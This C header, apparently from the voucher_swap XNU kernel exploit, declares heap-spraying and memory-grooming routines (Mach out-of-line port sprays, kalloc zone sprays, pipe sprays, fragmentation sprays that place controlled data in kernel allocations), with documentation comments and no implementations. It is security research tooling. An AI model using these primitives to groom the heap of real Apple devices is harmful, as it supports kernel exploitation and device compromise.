/*
 * kernel_alloc.h
 * Brandon Azad
 */
#ifndef VOUCHER_SWAP__KERNEL_ALLOC_H_
#define VOUCHER_SWAP__KERNEL_ALLOC_H_

#include <mach/mach.h>
#include <stddef.h>
#include <stdbool.h>

/*
 * kalloc_size_for_message_size
 *
 * Description:
 * 	Return the kalloc allocation size corresponding to sending a message of the specified size.
 *
 * 	This is only correct for messages large enough that the ipc_kmsg struct is allocated with
 * 	kalloc().
 */
size_t kalloc_size_for_message_size(size_t message_size);

/*
 * ipc_kmsg_size_for_message_size
 *
 * Description:
 * 	Return the allocation size of the ipc_kmsg for the given message size.
 */
size_t ipc_kmsg_size_for_message_size(size_t message_size);

/*
 * ool_ports_spray_port
 *
 * Description:
 * 	Spray the given Mach port with Mach messages that contain out-of-line ports descriptors
 * 	with the given ports. The goal is to spray the target kalloc zone with many copies of a
 * 	particular array of OOL ports.
 *
 * 	Make sure that the port's queue limits are sufficient to hold the specified number of
 * 	messages.
 *
 * 	Unfortunately, we cannot avoid the creation of ipc_kmsg objects to hold the messages
 * 	enqueued on the port. You should ensure that the appropriate kalloc zone's freelist has
 * 	sufficiently many intermediates to ensure that ipc_kmsg allocation does not interfere with
 * 	the OOL ports spray.
 *
 * 	There are limits on the number of OOL ports that can be sent in a message, the number of
 * 	descriptors in a message, and the number of messages that can be queued on a port. Be sure
 * 	that the parameters you supply are valid, since this function does not check whether or not
 * 	the kernel will let your message through (or even whether they make sense).
 *
 * Parameters:
 * 	holding_port			The port on which to enqueue the Mach messages.
 * 	ool_ports			The OOL Mach ports to spray.
 * 	port_count			The number of OOL Mach ports.
 * 	ool_disposition			The disposition to send the OOL ports.
 * 	ool_count			The number of OOL ports descriptors to send per message.
 * 	message_size			The size of each message.
 * 	message_count			The number of messages to enqueue on the holding port.
 *
 * Returns:
 * 	Returns the number of messages that were successfully sent.
 */
size_t ool_ports_spray_port(mach_port_t holding_port,
    const mach_port_t* ool_ports, size_t port_count,
    mach_msg_type_name_t ool_disposition, size_t ool_count,
    size_t message_size, size_t message_count);

/*
 * kalloc_spray_port
 *
 * Description:
 * 	Spray the specified kalloc_zone with at least kalloc_count allocations by sending Mach
 * 	messages containing OOL ports to the specified holding port. Returns the number of kalloc
 * 	allocations that were actually performed.
 *
 * 	The point of this function is to quickly make as many kalloc allocations in the target zone
 * 	as possible using the specified holding port. The way we do this is by sending messages
 * 	with many OOL ports descriptors (consisting of empty ports) such that both the ipc_kmsg
 * 	struct for the message and the OOL port arrays fall into the target kalloc zone. We will
 * 	continue sending messages to the port until either we've created the required number of
 * 	allocations or we've filled up the port's message queue.
 *
 * 	To free the allocations, call mach_port_destroy() on the holding port. Note that this will
 * 	also free the holding port if there are no other references.
 *
 * Parameters:
 * 	holding_port			The port on which to enqueue the Mach messages.
 * 	min_kalloc_size			The minimum sized allocation that is handled by this zone.
 * 	kalloc_zone			The kalloc zone in which to spray allocations.
 * 	kalloc_count			The desired number of allocations to make.
 *
 * Returns:
 * 	Returns the number of kalloc allocations actually made, which may be less than the number
 * 	requested if the port fills up or if an error is encountered.
 */
size_t kalloc_spray_port(mach_port_t holding_port, size_t min_kalloc_size, size_t kalloc_zone,
    size_t kalloc_count);

/*
 * kalloc_spray_size
 *
 * Description:
 * 	Spray the specified kalloc_zone with spray_size bytes of allocations by sending Mach
 * 	messages containing OOL ports to the given holding ports.
 *
 * 	See kalloc_spray_port().
 *
 * 	To free the allocations, call destroy_ports() on the holding ports. Note that
 * 	destroy_ports() will also free the holding ports themselves if there are no other
 * 	references.
 *
 * Parameters:
 * 	holding_ports			The array of holding ports.
 * 	port_count		inout	On entry, the number of holding ports available. On exit,
 * 					the number of holding ports used.
 * 	min_kalloc_size			The minimum sized allocation that is handled by this zone.
 * 	kalloc_zone			The kalloc zone in which to spray allocations.
 * 	spray_size			The number of bytes to try and spray to the target zone.
 *
 * Returns:
 * 	Returns the number of bytes actually sprayed to the kalloc zone. This could be less than
 * 	the requested size if an error is encountered or more than the requested size if the spray
 * 	size was not an even multiple of the zone size.
 */
size_t kalloc_spray_size(mach_port_t* holding_ports, size_t* port_count,
    size_t min_kalloc_size, size_t kalloc_zone, size_t spray_size);

/*
 * ool_ports_spray_size
 *
 * Description:
 * 	Spray spray_size bytes of kernel memory with the specified out-of-line ports.
 *
 * Parameters:
 * 	holding_ports			The array of holding ports.
 * 	holding_port_count	inout	On entry, the number of holding ports available. On exit,
 * 					the number of holding ports used.
 * 	message_size			The size of each message to send. This parameter should be
 * 					chosen carefully, as allocations will be taken out of the
 * 					corresponding kalloc zone.
 * 	ool_ports			The OOL Mach ports to spray.
 * 	ool_port_count			The number of OOL Mach ports.
 * 	ool_disposition			The disposition to send the OOL ports.
 * 	spray_size			The number of bytes of OOL ports to try and spray.
 *
 * Returns:
 * 	Returns the number of bytes of OOL ports actually sprayed.
 */
size_t ool_ports_spray_size_with_gc(mach_port_t* holding_ports, size_t* holding_port_count,
    size_t message_size, const mach_port_t* ool_ports, size_t ool_port_count,
    mach_msg_type_name_t ool_disposition, size_t spray_size);

// Added by nedwill, doesn't sleep at gc boundaries.
size_t ool_ports_spray_size(mach_port_t* holding_ports, size_t* holding_port_count,
    size_t message_size, const mach_port_t* ool_ports, size_t ool_port_count,
    mach_msg_type_name_t ool_disposition, size_t spray_size);

/*
 * create_ports
 *
 * Description:
 * 	Create an array of Mach ports. The Mach ports are receive rights only. Once the array is no
 * 	longer needed, deallocate it with free().
 */
mach_port_t* create_ports(size_t count);

/*
 * destroy_ports
 *
 * Description:
 * 	Destroys the specified Mach ports and sets them to MACH_PORT_DEAD.
 */
void destroy_ports(mach_port_t* ports, size_t count);

/*
 * deallocate_ports
 *
 * Description:
 * 	Deallocates the specified Mach ports and sets them to MACH_PORT_DEAD.
 */
void deallocate_ports(mach_port_t* ports, size_t count);

/*
 * port_increase_queue_limit
 *
 * Description:
 * 	Increase the queue limit on the specified Mach port to MACH_PORT_QLIMIT_MAX.
 */
void port_increase_queue_limit(mach_port_t port);

/*
 * port_insert_send_right
 *
 * Description:
 * 	Insert a send right on the specified port, which must name a receive right.
 */
void port_insert_send_right(mach_port_t port);

/*
 * port_drain_messages
 *
 * Description:
 * 	Drain all the messages currently queued on the specified port. The messages are passed to
 * 	the message_handler block, which is responsible for processing the messages and freeing any
 * 	associated resources (e.g. with mach_msg_destroy()).
 */
void port_drain_messages(mach_port_t port, void (^message_handler)(mach_msg_header_t*));

/*
 * port_discard_messages
 *
 * Description:
 * 	Discard all the messages currently queued on the specified port. The messages are received
 * 	and passed directly to mach_msg_destroy().
 */
void port_discard_messages(mach_port_t port);

/*
 * ool_ports_spray_receive
 *
 * Description:
 * 	Receive all the messages queued on the holding ports and pass the OOL ports descriptors to
 * 	the specified handler block. The messages are destroyed after they are processed.
 */
void ool_ports_spray_receive(mach_port_t* holding_ports, size_t holding_port_count,
    void (^ool_ports_handler)(mach_port_t*, size_t));

/*
 * increase_file_limit
 *
 * Description:
 * 	Increase our process's limit on the number of open files.
 */
void increase_file_limit(void);

/*
 * pipe_close
 *
 * Description:
 * 	Close the file descriptors of a pipe.
 */
void pipe_close(int pipefds[2]);

/*
 * create_pipes
 *
 * Description:
 * 	Create a spray of pipes. On entry, pipe_count specifies the requested number of pipes, and
 * 	on return it contains the number of pipes actually created.
 *
 * 	The pipes are returned as an array of file descriptors.
 */
int* create_pipes(size_t* pipe_count);

/*
 * close_pipes
 *
 * Description:
 * 	Close the pipes in an array.
 */
void close_pipes(int* pipefds, size_t pipe_count);

/*
 * pipe_spray
 *
 * Description:
 * 	Spray data to the pipes. Note that XNU limits the collective size of all pipe buffers to
 * 	16 MB, so that's the maximum we'll be able to spray.
 *
 * 	Note that the last byte of the sprayed data won't be written to memory!
 *
 * Parameters:
 * 	pipefds				The pipe file descriptors.
 * 	pipe_count			The number of pipe fd pairs.
 * 	pipe_buffer			The data to spray.
 * 	pipe_buffer_size		The size of the data to spray.
 * 	update				A callback to modify the data on each iteration.
 *
 * Returns:
 * 	Returns the number of pipes actually filled.
 */
size_t pipe_spray(const int* pipefds, size_t pipe_count,
    void* pipe_buffer, size_t pipe_buffer_size,
    void (^update)(uint32_t pipe_index, void* data, size_t size));

/*
 * mach_message_size_for_ipc_kmsg_size
 *
 * Description:
 * 	Return the Mach message size needed to allocate an ipc_kmsg of the specified size. Because
 * 	small ipc_kmsgs are allocated from ipc_kmsg_zone, the minimum ipc_kmsg size is 256 bytes.
 *
 * 	The returned size is exactly correct when ipc_kmsg_size is a multiple of 16, otherwise it
 * 	could be slightly small.
 */
size_t mach_message_size_for_ipc_kmsg_size(size_t ipc_kmsg_size);

/*
 * mach_message_size_for_kalloc_size
 *
 * Description:
 * 	Identical to mach_message_size_for_ipc_kmsg_size(), except that it returns 0 if the
 * 	allocation is small enough that the ipc_kmsg would be allocated from the ipc_kmsg_zone
 * 	rather than from kalloc.
 */
size_t mach_message_size_for_kalloc_size(size_t kalloc_size);

/*
 * ipc_kmsg_size_for_mach_message_size
 *
 * Description:
 * 	Return the ipc_kmsg allocation size of the ipc_kmsg for the given Mach message size.
 * 	ipc_kmsgs are allocated from the ipc_kmsg_zone if they are small enough, and otherwise are
 * 	allocated with kalloc().
 */
size_t ipc_kmsg_size_for_mach_message_size(size_t message_size);

/*
 * kalloc_size_for_mach_message_size
 *
 * Description:
 * 	Return the kalloc allocation size corresponding to sending a Mach message of the specified
 * 	size. If the message is small enough that it is allocated from the ipc_kmsg_zone instead,
 * 	returns 0.
 */
size_t kalloc_size_for_mach_message_size(size_t message_size);

/*
 * ipc_kmsg_kalloc_send_one
 *
 * Description:
 * 	Send a single Mach message that generates a kalloc allocation of the specified size.
 *
 * Parameters:
 * 	holding_port			The Mach port on which to enqueue the message.
 * 	kalloc_size			The target ipc_kmsg allocation size.
 */
bool ipc_kmsg_kalloc_send_one(mach_port_t holding_port, size_t kalloc_size);

/*
 * ool_ports_send_one
 *
 * Description:
 * 	Send a Mach message containing the specified out-of-line Mach ports descriptor.
 *
 * Parameters:
 * 	holding_port			The Mach port on which to enqueue the message.
 * 	ool_ports			The array of out-of-line Mach ports to send.
 * 	ool_port_count			The number of Mach ports in the ool_ports array.
 * 	ool_ports_disposition		The disposition to send the out-of-line Mach ports.
 * 	ipc_kmsg_size			The size of the ipc_kmsg allocation.
 */
bool ool_ports_send_one(mach_port_t holding_port,
		const mach_port_t *ool_ports,
		size_t ool_port_count,
		mach_msg_type_name_t ool_ports_disposition,
		size_t ipc_kmsg_size);

/*
 * mach_message_spray
 *
 * Description:
 * 	Spray the specified Mach message on the holding ports.
 *
 * Notes:
 * 	Make sure that the port's queue limits are sufficient to hold the specified number of
 * 	messages.
 *
 * Parameters:
 * 	holding_ports			An array of Mach ports on which to enqueue Mach messages.
 * 	holding_port_count	inout	The number of Mach ports in the holding_ports array. On
 * 					return, holding_port_count is set to the number of ports
 * 					actually used.
 * 	message				The Mach message to send.
 * 	message_size			The size of the Mach message.
 * 	message_count			The number of times to send the message.
 * 	messages_per_port		The target number of Mach messages to enqueue on each port.
 * 					The last pair of holding ports used may each hold fewer
 * 					messages. Use 0 for MACH_PORT_QLIMIT_MAX.
 *
 * Returns:
 * 	Returns the total number of messages sprayed.
 */
size_t mach_message_spray(mach_port_t *holding_ports, size_t *holding_port_count,
		mach_msg_header_t *message, size_t message_size,
		size_t message_count, size_t messages_per_port);

/*
 * ipc_kmsg_kalloc_fragmentation_spray
 *
 * Description:
 * 	Spray ipc_kmsg allocations of the specified size by alternately enqueueing messages on
 * 	either the first or second port of a pair of holding ports. This is useful when trying to
 * 	fragment kalloc allocations larger than the max kalloc zone (kalloc.32768, 2 pages) and
 * 	which thus fall into either the kalloc_map or kernel_map.
 *
 * 	The array of holding ports is interpreted in pairs. Mach messages of sufficient size to
 * 	trigger a kalloc allocation of size kalloc_size are alternatingly sent to the first and
 * 	second ports of the pair until each port has messages_per_port messages queued on it or
 * 	until message_conut messages have been sent in total. If there are still more messages to
 * 	send after enqueueing messages_per_port messages on each port in the pair, then the process
 * 	repeats with the next pair of ports in the holding_ports array.
 *
 * 	In order to produce fragmentation, destroy one port of each pair to free alternating
 * 	ipc_kmsg allocations.
 *
 * Notes:
 * 	Make sure that the port's queue limits are sufficient to hold the specified number of
 * 	messages.
 *
 * Parameters:
 * 	holding_ports			An array of Mach ports on which to enqueue Mach messages.
 * 	holding_port_count	inout	The number of Mach ports in the holding_ports array. This
 * 					should be even. On return, holding_port_count is set to the
 * 					number of ports actually used.
 * 	kalloc_size			The kalloc allocation size for each ipc_kmsg. This must be
 * 					a valid allocation size, as no checks are performed.
 * 	messsage_count			The total number of messages to send.
 * 	messages_per_port		The target number of Mach messages to enqueue on each port.
 * 					The last pair of holding ports used may each hold fewer
 * 					messages. Use 0 for MACH_PORT_QLIMIT_MAX.
 *
 * Returns:
 * 	Returns the total number of messages sprayed.
 *
 * 	On return, holding_port_count is set to the number of holding ports used. (This will always
 * 	be even.)
 */
size_t ipc_kmsg_kalloc_fragmentation_spray(mach_port_t *holding_ports, size_t *holding_port_count,
		size_t kalloc_size, size_t message_count, size_t messages_per_port);

/*
 * ipc_kmsg_kalloc_spray_contents_size
 *
 * Description:
 * 	Compute the bounds of the region of data that can be controlled when using
 * 	ipc_kmsg_kalloc_spray() to spray kalloc allocations of the specified size.
 *
 * Parameters:
 * 	kalloc_size			The target ipc_kmsg allocation size.
 * 	contents_start		out	On return, the offset of the beginning of the controlled
 * 					contents from the beginning of the ipc_kmsg allocation.
 * 	contents_end		out	On return, the offset of the end of the controlled contents
 * 					from the beginning of the ipc_kmsg allocation.
 *
 * Returns:
 * 	Returns the size of controllable contents data.
 */
size_t ipc_kmsg_kalloc_spray_contents_size(size_t kalloc_size,
		size_t *contents_start, size_t *contents_end);

/*
 * ipc_kmsg_kalloc_spray
 *
 * Description:
 * 	Spray kalloc allocations containing controlled data by sending simple ipc_kmsgs to the
 * 	specified holding ports.
 *
 * Notes:
 * 	Make sure that the port's queue limits are sufficient to hold the specified number of
 * 	messages.
 *
 * Parameters:
 * 	holding_ports			An array of Mach ports on which to enqueue Mach messages.
 * 	holding_port_count	inout	The number of Mach ports in the holding_ports array. On
 * 					return, holding_port_count is set to the number of ports
 * 					actually used.
 * 	data				The data contents of the ipc_kmsg. May be NULL to spray
 * 					zeros. The size of the controlled data and the offsets of
 * 					the start and end of this data inside the kalloc allocation
 * 					can be found by calling
 * 					ipc_kmsg_kalloc_spray_contents_size().
 * 	kalloc_size			The target kalloc allocation size for the ipc_kmsg.
 * 	message_count			The number of ipc_kmsg allocations to generate.
 * 	messages_per_port		The target number of messages to enqueue on each port. The
 * 					last port used may have fewer messages enqueued. Use 0 for
 * 					MACH_PORT_QLIMIT_MAX.
 *
 * Returns:
 * 	Returns the total number of messages sprayed.
 */
size_t ipc_kmsg_kalloc_spray(mach_port_t *holding_ports, size_t *holding_port_count,
		const void *data, size_t kalloc_size,
		size_t message_count, size_t messages_per_port);

/*
 * ool_ports_spray
 *
 * Description:
 * 	Spray the given holding ports with Mach messages that contain out-of-line ports descriptors
 * 	with the given ports. The goal is to spray the kalloc zone in which the out-of-line ports
 * 	array falls with many copies of a particular array of OOL ports.
 *
 * Notes:
 * 	Make sure that the port's queue limits are sufficient to hold the specified number of
 * 	messages.
 *
 * 	Unfortunately, we cannot avoid the creation of ipc_kmsg objects to hold the messages
 * 	enqueued on the port. You should ensure that the appropriate kalloc zone's freelist has
 * 	sufficiently many intermediates to ensure that ipc_kmsg allocation does not interfere with
 * 	the OOL ports spray.
 *
 * 	There are limits on the number of OOL ports that can be sent in a message, the number of
 * 	descriptors in a message, and the number of messages that can be queued on a port. Be sure
 * 	that the parameters you supply are valid, since this function does not check whether or not
 * 	the kernel will let your message through (or even whether they make sense).
 *
 * Parameters:
 * 	holding_ports			An array of Mach ports on which to enqueue Mach messages.
 * 	holding_port_count	inout	The number of Mach ports in the holding_ports array. On
 * 					return, holding_port_count is set to the number of ports
 * 					actually used.
 * 	ool_ports			The array of out-of-line Mach ports to spray.
 * 	ool_port_count			The number of Mach ports in the ool_ports array.
 * 	ool_ports_disposition		The disposition to send the out-of-line Mach ports.
 * 	ool_port_descriptor_count	The total number of out-of-line Mach port descriptors to
 * 					send (i.e., the number of OOL ports arrays to allocate).
 * 	ool_port_descriptors_per_message	The target number of out-of-line Mach port
 * 					descriptors to send in each message. Use 0 for the maximum
 * 					possible.
 * 	ipc_kmsg_size			The size of each ipc_kmsg allocation.
 * 	messages_per_port		The target number of messages to enqueue on each port. The
 * 					last port used may have fewer messages enqueued. Use 0 for
 * 					MACH_PORT_QLIMIT_MAX.
 *
 * Returns:
 * 	Returns the total number of out-of-line Mach port descriptors sent.
 */
size_t ool_ports_spray(mach_port_t *holding_ports, size_t *holding_port_count,
		const mach_port_t *ool_ports, size_t ool_port_count,
		mach_msg_type_name_t ool_ports_disposition, size_t ool_port_descriptor_count,
		size_t ool_port_descriptors_per_message, size_t ipc_kmsg_size,
		size_t messages_per_port);
/*
 * mach_ports_create
 *
 * Description:
 * 	Create an array of Mach ports. The Mach ports are receive rights only. Once the array is no
 * 	longer needed, deallocate it with free().
 */
mach_port_t *mach_ports_create(size_t count);

/*
 * mach_ports_destroy
 *
 * Description:
 * 	Destroys the specified Mach ports and sets them to MACH_PORT_DEAD.
 */
void mach_ports_destroy(mach_port_t *ports, size_t count);

/*
 * mach_ports_deallocate
 *
 * Description:
 * 	Deallocates the specified Mach ports and sets them to MACH_PORT_DEAD.
 */
void mach_ports_deallocate(mach_port_t *ports, size_t count);

/*
 * mach_port_increase_queue_limit
 *
 * Description:
 * 	Increase the queue limit on the specified Mach port to MACH_PORT_QLIMIT_MAX.
 */
void mach_port_increase_queue_limit(mach_port_t port);

/*
 * mach_port_insert_send_right
 *
 * Description:
 * 	Insert a send right on the specified port, which must name a receive right.
 */
void mach_port_insert_send_right(mach_port_t port);

/*
 * mach_port_drain_messages
 *
 * Description:
 * 	Drain all the messages currently queued on the specified port. The messages are passed to
 * 	the message_handler block, which is responsible for processing the messages and freeing any
 * 	associated resources (e.g. with mach_msg_destroy()).
 */
void mach_port_drain_messages(mach_port_t port, void (^message_handler)(mach_msg_header_t *));

/*
 * mach_port_discard_messages
 *
 * Description:
 * 	Discard all the messages currently queued on the specified port. The messages are received
 * 	and passed directly to mach_msg_destroy().
 */
void mach_port_discard_messages(mach_port_t port);

/*
 * ool_ports_receive
 *
 * Description:
 * 	Receive all the messages queued on the holding ports and pass the OOL ports descriptors to
 * 	the specified handler block. The messages are destroyed after they are processed.
 */
void ool_ports_receive(const mach_port_t *holding_ports,
		size_t holding_port_count,
		void (^ool_ports_handler)(mach_port_t *, size_t));

// ---- Convenience API ---------------------------------------------------------------------------

// An array of holding ports, for use by the convenience API.
struct holding_port_array {
	mach_port_t *ports;
	size_t count;
};

/*
 * holding_ports_create
 *
 * Description:
 * 	Create an array of holding ports. The ports are returned twice. Pass the original holding
 * 	port array to holding_ports_destroy to destroy the ports and free memory when no longer
 * 	needed.
 */
struct holding_port_array holding_ports_create(size_t count);

/*
 * holding_ports_destroy
 *
 * Description:
 * 	Destroy the ports and free memory in a holding_port_array.
 */
void holding_ports_destroy(struct holding_port_array all_ports);

/*
 * holding_port_grab
 *
 * Description:
 * 	Grab a single port from the holding ports array. The port is still present in the original
 * 	array's memory, but is popped from the front of the array that is passed in.
 */
mach_port_t holding_port_grab(struct holding_port_array *holding_ports);

/*
 * holding_port_grab
 *
 * Description:
 * 	Like holding_port_grab(), except also replace the Mach port in the array with
 * 	MACH_PORT_DEAD.
 */
mach_port_t holding_port_pop(struct holding_port_array *holding_ports);

// State for ipc_kmsg_kalloc_fragmentation_spray_().
struct ipc_kmsg_kalloc_fragmentation_spray {
	struct holding_port_array holding_ports;
	size_t spray_size;
	size_t kalloc_size_per_port;
};

/*
 * ipc_kmsg_kalloc_fragmentation_spray_
 *
 * Description:
 * 	A convenience wrapper around ipc_kmsg_kalloc_fragmentation_spray().
 */
void ipc_kmsg_kalloc_fragmentation_spray_(struct ipc_kmsg_kalloc_fragmentation_spray *spray,
		size_t kalloc_size,
		size_t spray_size,
		size_t kalloc_size_per_port,
		struct holding_port_array *holding_ports);

/*
 * ipc_kmsg_kalloc_fragmentation_spray_fragment_memory_
 *
 * Description:
 * 	Fragment memory by releasing alternating allocations from a fragmentation spray created by
 * 	ipc_kmsg_kalloc_fragmentation_spray_(). If from_end is positive then the specified amount
 * 	of memory is released from the beginning of the spray, otherwise it is released from the
 * 	end.
 */
void ipc_kmsg_kalloc_fragmentation_spray_fragment_memory_(
		struct ipc_kmsg_kalloc_fragmentation_spray *spray,
		size_t free_size,
		int from_end);

// State for ipc_kmsg_kalloc_spray_().
struct ipc_kmsg_kalloc_spray {
	struct holding_port_array holding_ports;
	size_t spray_size;
	size_t kalloc_allocation_size_per_port;
};

/*
 * ipc_kmsg_kalloc_spray_
 *
 * Description:
 * 	A convenience wrapper around ipc_kmsg_kalloc_spray().
 */
void ipc_kmsg_kalloc_spray_(struct ipc_kmsg_kalloc_spray *spray,
		const void *data,
		size_t kalloc_size,
		size_t spray_size,
		size_t kalloc_allocation_limit_per_port,
		struct holding_port_array *holding_ports);

// State for ool_ports_spray_().
struct ool_ports_spray {
	struct holding_port_array holding_ports;
	size_t sprayed_count;
};

/*
 * ool_ports_spray_
 *
 * Description:
 * 	A convenience wrapper around ool_ports_spray().
 */
void ool_ports_spray_(struct ool_ports_spray *spray,
		const mach_port_t *ool_ports,
		size_t ool_port_count,
		mach_msg_type_name_t ool_ports_disposition,
		size_t ool_port_descriptor_count,
		size_t ool_port_descriptors_per_message,
		size_t ipc_kmsg_size,
		size_t messages_per_port,
		struct holding_port_array *holding_ports);

#endif
